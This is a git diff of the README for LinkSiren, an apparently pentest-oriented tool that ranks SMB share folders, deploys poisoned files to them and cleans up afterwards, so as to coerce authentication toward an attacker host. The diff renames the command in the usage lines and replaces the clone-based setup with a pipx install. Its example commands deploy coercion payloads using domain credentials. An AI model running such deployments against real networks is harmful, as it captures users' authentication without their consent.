@@ -42,7 +42,7 @@ LinkSiren offers the following modes of operation:
 Create poisoned files to use for coercion and store them locally.
 ```
 linksiren generate --help
-usage: link_siren.py generate [-h] -a ATTACKER [-n PAYLOAD]
+usage: linksiren generate [-h] -a ATTACKER [-n PAYLOAD]
 
 optional arguments:
   -h, --help            show this help message and exit
@@ -59,7 +59,7 @@ Required Arguments:
 Given a list of accessible shares, output ranks for the folders within them based on the liklihood placing a file in the folder will coerce authentication from a user.
 ```
 linksiren rank --help
-usage: link_siren.py rank [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f]
+usage: linksiren rank [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f]
 
 optional arguments:
   -h, --help            show this help message and exit
@@ -86,7 +86,7 @@ Required Arguments:
 Given a list of accessible shares and customizable constraints, including a maximum number of target folders per share, output UNC paths to the optimal folders for placing poisoned files.
 ```
 linksiren identify --help
-usage: link_siren.py identify [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f]
+usage: linksiren identify [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f]
                               [-mf MAX_FOLDERS_PER_TARGET]
 
 optional arguments:
@@ -117,7 +117,7 @@ Required Arguments:
 Generate poisoned files for coercion and deploy them to specified UNC paths. Typically the specified UNC paths are the output of `identify` mode. Output a list of UNC paths to folders where payloads were successfully deployed for cleanup.
 ```
 linksiren deploy --help
-usage: link_siren.py deploy [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS -a ATTACKER [-n PAYLOAD]
+usage: linksiren deploy [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS -a ATTACKER [-n PAYLOAD]
 
 optional arguments:
   -h, --help            show this help message and exit
@@ -142,7 +142,7 @@ Required Arguments:
 Remove all payloads from the specified UNC paths, typically the output of `deploy` mode.
 ```
 linksiren cleanup --help
-usage: link_siren.py cleanup [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS -a ATTACKER [-n PAYLOAD]
+usage: linksiren cleanup [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS -a ATTACKER [-n PAYLOAD]
 
 optional arguments:
   -h, --help            show this help message and exit
@@ -180,9 +180,8 @@ Search Connectors (.searchConnector-ms): This is generally the best option. They
 
 ## How do I use this NOW?
 ```bash
-# Setup
-git clone https://github.com/gjhami/LinkSiren.git && cd LinkSiren
-python -m pip install -r requirements.txt
+# Install using pipx
+pipx install linksiren
 
 # Identify optimal locations for poisoned file deployment
 linksiren identify --username <username> --password <password> --domain <domain.tld> --targets <shares file>
@@ -198,15 +197,8 @@ linksiren cleanup --username <username> --password <password> --domain <domain.t
 
 ## How do I use this the \~right\~ way?
 ```bash
-# Get the project
-git clone https://github.com/gjhami/LinkSiren.git
-cd LinkSiren
-
-# Set up a virtual environment and install requirements
-python -m venv .venv
-source ./.venv/bin/activate # Linux
-# .\.venv\Scripts\activate # Windows
-python -m pip install -r requirements.txt
+# Install using pipx
+pipx install linksiren
 
 # 1. Create a targets file containing accessible shares, one per line, in the following format: \\server.domain.tld\share
 #    I recommend crackmapexec or shareenum, make sure you can delete files you deploy
